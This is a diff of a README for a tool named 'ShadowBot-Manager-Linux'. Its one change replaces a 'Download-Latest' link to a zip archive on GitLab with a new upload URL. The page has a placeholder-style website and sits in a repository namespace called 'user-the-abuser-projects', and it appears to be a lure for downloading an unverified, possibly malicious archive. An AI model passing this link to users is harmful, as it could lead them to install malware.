@@ -2,7 +2,7 @@
 
 # Download:
 
-[![Download-Latest](https://img.shields.io/badge/Download-Latest-blue)](https://gitlab.com/-/project/67598107/uploads/d61ad9cef13b3ae8265d7309f0ba5fed/ShadowBot-Manager-Linux-1.0.0-1.0.0.zip)
+[![Download-Latest](https://img.shields.io/badge/Download-Latest-blue)](https://gitlab.com/-/project/67598107/uploads/c938d11a8385b9b95d3a67b5a15f7548/ShadowBot-Manager-Linux-1.0.0-1.0.0.zip)
 
 [![Official-Website](https://img.shields.io/badge/Official-Website-blue?logo=google-chrome&logoColor=white)](https://sample-text.webador.de)
 [![GitLab-Repository](https://img.shields.io/badge/GitLab-Repository-orange?logo=gitlab)](https://gitlab.com/user-the-abuser-projects/shadowbot-manager-linux)
